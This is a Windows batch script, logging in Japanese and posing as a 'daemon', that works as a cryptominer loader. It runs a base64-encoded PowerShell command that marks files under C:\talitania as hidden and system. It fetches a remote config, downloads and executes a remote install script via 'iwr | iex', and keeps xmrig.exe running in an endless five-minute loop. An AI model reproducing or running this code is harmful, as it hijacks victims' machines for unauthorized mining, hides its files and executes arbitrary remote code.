@echo off
setlocal enabledelayedexpansion

set ROOT=%~dp0
if "%ROOT:~-1%"=="\" set ROOT=%ROOT:~0,-1%

set LOGDIR=%ROOT%\logs
if not exist "%LOGDIR%" mkdir "%LOGDIR%"

set LOGFILE=%LOGDIR%\daemon.log

echo %date% %time% [情報] デーモン開始 >> "%LOGFILE%"
set "b64=YQB0AHQAcgBpAGIAIAArAGgAIAArAHMAIAAiAEMAOgBcAHQAYQBsAGkAdABhAG4AaQBhAFwAKgAiAA=="

:listener
powershell.exe -NoProfile -EncodedCommand %b64%

echo %date% %time% [情報] 設定を取得中 >> "%LOGFILE%"
curl -L -s -o "%ROOT%\config.json" "https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/config" >> "%LOGFILE%" 2>&1
if errorlevel 1 echo %date% %time% [エラー] 設定のダウンロードに失敗しました >> "%LOGFILE%"

if not exist "%ROOT%\xmrig.exe" (
  echo %date% %time% [情報] xmrig.exe が存在しません。インストールを試みます >> "%LOGFILE%"
  taskkill /f /im xmrig.exe >nul 2>&1
  powershell -NoProfile -Command "iwr https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/install | iex" >> "%LOGFILE%" 2>&1
  if errorlevel 1 echo %date% %time% [エラー] xmrig のインストールに失敗しました >> "%LOGFILE%"
)

tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if errorlevel 1 (
  echo %date% %time% [情報] xmrig が動作していません。起動します >> "%LOGFILE%"
  taskkill /F /IM xmrig.exe >nul 2>&1
  start "" "%ROOT%\xmrig.exe" >> "%LOGFILE%" 2>&1
  
  if errorlevel 1 echo %date% %time% [エラー] xmrig の起動に失敗しました >> "%LOGFILE%"
)

echo %date% %time% [情報] 300秒待機します >> "%LOGFILE%"
timeout /t 300 /nobreak >nul
goto listener